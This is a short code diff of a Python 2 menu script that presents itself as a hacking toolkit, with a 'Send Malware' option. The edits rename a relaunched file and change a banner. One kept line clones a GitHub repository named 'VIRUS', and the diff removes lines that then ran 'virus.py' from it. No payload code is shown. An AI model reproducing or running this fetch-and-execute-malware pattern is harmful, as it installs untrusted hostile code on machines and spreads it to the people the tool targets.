@@ -29,14 +29,14 @@ def login():
         else:
                 print "\033[33;1mA\033[31;1mc\033[36;1mc\033[35;1me\033[32;1ms\033[34;1ms\033[35;1mG\033[33;1ma\033[31;1mg\033[36;1m\033[35;1ma\033[33;1ml:("
                 time.sleep(1.5)
-                os.system("python2 aneh.py")
+                os.system("python2 All.py")
 if __name__ == "__main__":
         login()
 
 
 def menu():
         os.system("clear")
-        os.system("figlet Aneh?")
+        os.system("figlet All")
         print "\t \033[36;1mTools \033[35;1mBy \033[33;1mReza \033[32;1mAlfauzan\n"
         print("\033[35;1m1. Send Malware")
         print("\033[34;1m2. Ubah Tampilan")
@@ -141,9 +141,6 @@ def menu():
                 os.system("clear")
                 os.system("figlet Sabar . .")
                 os.system("git clone https://github.com/GRCR4K3R/VIRUS")
-                os.system("cd VIRUS")
-                os.system("ls")
-                os.system("python2 virus.py")
         if pilih ==8:
                 os.system("clear")
                 os.system("figlet Byee")
